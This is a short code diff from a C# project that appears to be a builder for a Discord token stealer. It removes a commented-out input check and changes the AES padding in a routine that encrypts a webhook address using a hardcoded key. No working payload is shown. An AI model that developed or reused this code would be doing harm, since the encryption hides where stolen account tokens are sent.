@@ -415,23 +415,6 @@ namespace ItroublveTSC
         }
         #endregion
         #region Textbox Options
-        #region Check();
-        //private void FinalresbatTxt_TextChanged(object sender, EventArgs e)
-        //{
-        //    if (FinalresbatTxt.Text.Contains("https://discord.com/channels/") || FinalresbatTxt.Text.Contains("app.com/channels/") || FinalresbatTxt.Text.Contains(".com/channels/"))
-        //    {
-        //        if (MessageBox.Show("You need to paste a link to the file and not to the message!\nHave you actually watched the video?", "ItroublveTSC", MessageBoxButtons.YesNo, MessageBoxIcon.Error) == DialogResult.No)
-        //        {
-        //            Process.Start("");
-        //        }
-        //        else
-        //        {
-        //            MessageBox.Show("I doubt you, but sure.", "ItroublveTSC");
-        //        }
-        //        FinalresbatTxt.Text = null;
-        //    }
-        //}
-        #endregion
         #region Enable/Disable textbox
         private void CustomEXEchkbox_CheckedChanged(object sender, EventArgs e)
         {
@@ -534,10 +517,9 @@ namespace ItroublveTSC
                     Key = new byte[] { 88, 105, 179, 95, 179, 135, 116, 246, 101, 235, 150, 231, 111, 77, 22, 131 },
                     IV = new byte[16],
                     Mode = CipherMode.CBC,
-                    Padding = PaddingMode.Zeros
+                    Padding = PaddingMode.PKCS7
                 };
-                ICryptoTransform crypto;
-                crypto = aes.CreateEncryptor();
+                var crypto = aes.CreateEncryptor();
                 return crypto.TransformFinalBlock(enc_webhook, 0, enc_webhook.Length);
             }
             catch (Exception x)
